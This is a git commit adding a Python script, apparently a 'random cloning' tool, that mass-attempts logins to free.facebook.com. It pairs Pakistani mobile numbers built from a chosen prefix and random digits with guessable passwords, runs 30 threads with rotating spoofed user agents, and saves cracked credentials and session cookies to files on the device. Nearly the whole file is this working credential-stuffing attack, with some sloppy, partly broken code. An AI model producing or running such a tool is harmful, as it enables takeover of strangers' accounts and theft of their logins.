3355f03f70250225e97b109dab2561c859838402
Mr-devil666 <111603881+Steverojer@users.noreply.github.com>
2022-10-07 15:24:52 +0500

    Add via upload

---
+++ Randm.py
@@ -0,0 +1,476 @@
+#!/usr/bin/python3
+#coding=utf-8
+#Coder Mr_devil brand 666
+#script version 2.0.4
+
+### Import Module ###
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as tred
+import os,sys,time,json,random,re,string,platform,base64,platform,uuid
+import requests,random,sys,json,os,re
+from time import sleep
+from os import system
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
+from datetime import date
+from datetime import datetime
+from time import sleep
+from time import sleep as waktu
+from random import random as acak
+from random import choice as pilih
+from random import randint
+from bs4 import BeautifulSoup
+import requests as ress
+from sys import exit as exit
+class jalan:
+    def __init__(self, z):
+        for e in z + "\n":
+            sys.stdout.write(e)
+            sys.stdout.flush()
+            time.sleep(0.009)
+
+#####Import Lib####
+
+import requests
+import bs4
+import sys
+import os
+import random
+import time
+import re
+import json
+import uuid
+import subprocess
+import marshal
+import rich
+import shutil
+import webbrowser
+from random import randint
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+from bs4 import BeautifulSoup as par
+from datetime import date
+from datetime import datetime
+from rich import print as printer
+from datetime import date
+import marshal
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures==2 > /dev/null')
+from bs4 import BeautifulSoup
+from datetime import date
+from datetime import datetime
+from time import sleep
+from time import sleep as waktu
+ugen = []
+
+A = '\x1b[1;97m' 
+B = '\x1b[1;96m' 
+C = '\x1b[1;91m' 
+D = '\x1b[1;92m'
+M = '\033[1;31m'
+H = '\033[1;32m'
+N = '\x1b[1;37m'    
+E = '\x1b[1;93m' 
+F = '\x1b[1;94m'
+G = '\x1b[1;95m'
+P = '\033[1;37m'
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m' #
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+MRD = '{ MRD }'
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today()
+MRD2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
+for xd in range(10000):
+    x='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['6','7','8','9','10','11','12'])
+    c=' en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=f'{x} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+try:
+    os.system('curl https://bacho1001.blogspot.com/2022/07/ua.html -o ua.html')
+except:
+    pass
+sock=open('ua.html','r').read().splitlines()
+def uaku():
+    try:
+        ua=open('bbnew.txt','r').read().splitlines()
+        for ub in ua:
+            ugen.append(ub)
+    except:
+        a=requests.get('https://bacho1001.blogspot.com/2022/07/ua.html').text
+        ua=open('.user-agents.txt','w')
+        aa=re.findall('line">(.*?)<',str(a))
+        for un in aa:
+            ua.write(un+'\n')
+        ua=open('.user-agents.txt','r').read().splitlines()
+
+loop = 0
+cp = []
+ok = []
+twf = []
+
+def clear():
+    os.system('clear')
+    print(logo)
+from time import localtime as lt
+from os import system as cmd
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx-12
+    tag = "PM"
+else:
+    a = ltx
+    tag = "AM"
+logo =f"""
+\033[1;92m██████╗  █████╗ ███╗   ██╗██████╗  ██████╗ ███╗   ███╗
+\033[1;92m██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔═══██╗████╗ ████║
+\033[1;92m██████╔╝███████║██╔██╗ ██║██║  ██║██║   ██║██╔████╔██║
+\033[1;92m██╔══██╗██╔══██║██║╚██╗██║██║  ██║██║   ██║██║╚██╔╝██║
+\033[1;92m██║  ██║██║  ██║██║ ╚████║██████╔╝╚██████╔╝██║ ╚═╝ ██║
+\033[1;92m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝     ╚═╝
+
+\033[1;97m------------------------------------------------
+\033[1;91m DEVELOPER   :MR DEVIl BRAND
+\033[1;91m TOOL NAME   :MRD rndm cloning v2.0.4
+\033[1;96m 🅼🆁 🅳🅴🆅🅸🅻 🆃🅷🅴 🅻🅾🆁🅳 🅾🅵 🅳🅰🆁🅺 🆆🅾🆁🅻🅳 
+\033[1;97m-------------------------------------------------"""
+
+
+def linex():
+    print(f'{RED}=================================================')
+def checks(ok,cp):
+    if not len(ok) != 0:
+        pass
+    if len(cp) != 0:
+        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mMRD-OK.txt' % (
+            H, P, str(len(ok))))
+        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mMRD-CP.txt' %
+              (H, P, str(len(cp))))
+        input("\x1b[1;97mPRESE ENTER TO BACK MENU ")
+        MRD()
+#---------------------[LOOP MENU]---------------------#
+loop = 0
+cp = []
+ok = []
+twf = []
+
+
+####APPLICATION CHECKER####
+def cek_apk(session,coki):
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
+    else:
+        print(f'\r[🎮] %s ☆ Your Active Apps ☆     :{WHITE}'%(GREEN))
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+        #else:
+            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
+    else:
+        print(f'\r[🎮] %s ◇ Your Expired Apps ◇    :{WHITE}'%(M))
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
+        else:
+            print(57*'-')
+
+def Mrd():
+    os.getuid
+    
+    os.system("clear");print(logo)
+    print('           \x1b[97m[\033[37;41m  M A I N   M E N U   \033[0;m] ')
+    print(f"")
+    print(f'{BLUE}══════════════════════════════════════════════════════')
+    print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print(f"{BLUE}══════════════════════════════════════════════════════")
+    print(f"{RED}[01] {WHITE}RANDOM PAK ID CLONE")
+    print(f"{RED}[02] {WHITE}FEED BACK ")
+    print(f"{RED}[03] {WHITE}CONTACT WITH OWNER ")
+    print(f"{RED}[00] {WHITE}EXIT PROGRAM ")
+    print(f"")
+    print(f"\033[1;91m========================================================")
+    MRD = input("[√] CHOOSE : ")
+    if MRD in ["1","01"]:
+    	password()
+    elif MRD in ["2","002"]:
+        os.system("xdg-open https://m.me/Mrdvl404")
+    elif MRD in ["3","03"]:
+        os.system("xdg-open https://m.me/Mrdvl404")
+        MRD()    
+    elif MRD in ["0","00"]:
+       exit()
+    else:
+        print('\033[1;31mINCORECT OPTION!\033[1;31m')
+        MRD()
+def password():
+    
+    os.system("clear")
+    print(logo)
+    print('       \x1b[97m[\033[37;41m  CHOOSE   METHOD   \033[0;m] ')
+    print(f"")
+    print(f"{RED}[01]{WHITE}METHOD 1  {GREEN} [ SUPER FAST]")
+    print(f"{RED}[02]{WHITE}METHOD 2  {GREEN} [ FAST     ]")
+    linex()
+    print("")
+    passX = input(f" {RED}CHOOSE{MRD2} : ")
+    if passX in ['1','01']:
+        password1()
+    elif passX in ['2','02']:
+        password2()
+    else:
+        MRD()
+        
+#method 1
+def password1():
+    
+    user=[]
+    twf =[]
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    print(logo)
+    print(f"")
+    clear()
+    print(f"          \x1b[97m[\033[37;41m Enter eny pak sim code   \033[0;m]")
+    print(f"")
+    linex()
+    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
+    print(f"")
+    print(f" 0300 ,0345 ,0321 ,0333 0310")
+    linex()
+    code = input(' CHOOSE : ')
+    os.system("clear")
+    print(logo)
+    print(f"")
+    print(f"          \x1b[97m[\033[37;41mEnter crack  limit    \033[0;m]")
+    print(f"")
+    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n ENTER LIMIT: '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as manshera:    
+        clear()
+        tl = str(len(user))
+        print(f" {WHITE}TOTAL IDZ           : {BLUE}"+tl+" √M[SUPER FAST⚡]")
+        print(f" {WHITE}COUNTRY             : {GREEN}PAKISTAN 🇵🇰")
+        print(f" {WHITE}CODE YOU CHOOSE     : {YELLOW}"+code)
+        print(f" {WHITE}TODAY DATE & TIME   :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
+        print(f'{RED}==========================================================')
+        for love in user:
+            uid = code+love
+            pwx = [love]
+            manshera.submit(free1,uid,pwx,tl)
+def free1(uid,pwx,tl):
+    global loop
+    global ok
+    global agents
+    try:
+        for ps in pwx:
+            bi = random.choice([A])
+            session = requests.Session()
+            pro = random.choice(ugen)
+            free_fb = session.get('https://free.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header = ({"authority": 'free.facebook.com',
+            "method": 'GET',
+           "scheme": 'https',
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            "accept-encoding": 'gzip, deflate, br',
+            "accept-language": 'en-US,en;q=0.9',
+            "cache-control": 'no-cache',
+            "pragma": 'no-cache',
+            "referer": 'https://free.facebook.com/',
+            "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
+            "sec-ch-ua-mobile": '?0',
+            "sec-ch-ua-platform":'"Windows"',
+            "sec-fetch-dest": 'manifest',
+            "sec-fetch-mode": 'cors',
+            "sec-fetch-site": 'same-origin',
+            "user-agent":pro,})
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                uid = coki[7:22]
+                print('\r\033[1;32m[MRD-OK] '+uid+' [√] '+ps+ '')
+                cek_apk(session,coki)
+                open('/sdcard/MRD-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                ok.append(uid)
+            elif 'checkpoint' in log_cookies:
+                if 'Enter login code to continue' in log_cookies:
+                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                    uid=coki[24:39]
+                    print('\r\033[1;34m[MRD-TF] '+uid+' [~] '+ps+' ')
+                    open('/sdcard/MRD-TF.txt', 'a').write(uid+' | '+ps+'\n')
+                    twf.append(uid)
+                else:
+                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                    uid=coki[24:39]
+                    Red = '\033[1;31m'
+                    print(f'\r\033[1;33m[MRD-CP] '+uid+' [×] '+ps+ ' ')
+                    open('/sdcard/MRD-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                    cp.append(uid)
+                    break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write(f'\r\33[1;37m[Cracking] [%s] \33[1;97m[OK:%s{MRD2}CP:%s]'%(loop,len(ok),len(cp))), 
+        sys.stdout.flush()
+        checks(ok,cp)
+    except:
+        pass
+
+
+
+#method 2#
+def password2():
+    user=[]
+    
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    print(logo)
+    print(f"")
+    clear()
+    print(f"          \x1b[97m[\033[37;41m  Enter eny pak sim code   \033[0;m]")
+    print(f"")
+    linex()
+    print(f"      \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]") 
+    print(f"")
+    print(f" 0300 ,0333 ,0321 ,0310 ,0345")
+    print(f"")
+    linex()
+    code = input(' Choose : ')
+    os.system("clear")
+    print(logo)
+    print("")
+    print("          \x1b[97m[\033[37;41mEnter crack  limit    \033[0;m]")
+    print(f"")
+    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n ENTER LIMIT: '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as manshera:    
+        clear()
+        tl = str(len(user))
+        print(f" {WHITE}TOTAL IDZ          : {BLUE}"+tl+" √M[ FAST 🔥]")
+        print(f" {WHITE}COUNTRY            : {GREEN}PAKISTAN 🇵🇰")
+        print(f" {WHITE}CODE YOU CHOOSE    : {YELLOW}"+code)
+        print(f" {WHITE}TODAY DATE & TIME  :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
+        print(f'{RED}==========================================================')
+        for love in user:
+            uid = code+love
+            pwx = [love,code+love]
+            manshera.submit(free2,uid,pwx,tl)
+def free2(uid,pwx,tl):
+    global loop
+    global ok
+    global agents
+    try:
+        for ps in pwx:
+            bi = random.choice([A])
+            session = requests.Session()
+            pro = random.choice(ugen)
+            free_fb = session.get('https://free.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header = ({"authority": 'free.facebook.com',
+            "method": 'GET',
+           "scheme": 'https',
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            "accept-encoding": 'gzip, deflate, br',
+            "accept-language": 'en-US,en;q=0.9',
+            "cache-control": 'no-cache',
+            "pragma": 'no-cache',
+            "referer": 'https://free.facebook.com/',
+            "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
+            "sec-ch-ua-mobile": '?0',
+            "sec-ch-ua-platform":'"Windows"',
+            "sec-fetch-dest": 'manifest',
+            "sec-fetch-mode": 'cors',
+            "sec-fetch-site": 'same-origin',
+            "user-agent":pro,})
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                uid = coki[7:22]
+                print('\r\033[1;32m[MRD-OK] '+uid+' [√] '+ps+ '')
+                cek_apk(session,coki)
+                open('/sdcard/MRD-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                ok.append(uid)
+            elif 'checkpoint' in log_cookies:
+                if 'Enter login code to continue' in log_cookies:
+                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                    uid=coki[24:39]
+                    print('\r\033[1;34m[MRD-TF] '+uid+' [~] '+ps+' ')
+                    open('/sdcard/MRD-TF.txt', 'a').write(uid+' | '+ps+'\n')
+                    twf.append(uid)
+                else:
+                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                    uid=coki[24:39]
+                    Red = '\033[1;31m'
+                    print(f'\r\033[1;33m[MRD-CP] '+uid+' [×] '+ps+ ' ')
+                    open('/sdcard/MRD-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                    cp.append(uid)
+                    break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write(f'\r\33[1;37m[Cracking] [%s] \33[1;97m[OK:%s{MRD2}CP:%s]'%(loop,len(ok),len(cp))), 
+        sys.stdout.flush()
+        checks(ok,cp)
+    except:
+        pass
+
+
+if __name__ == "__main__":
+  Mrd()
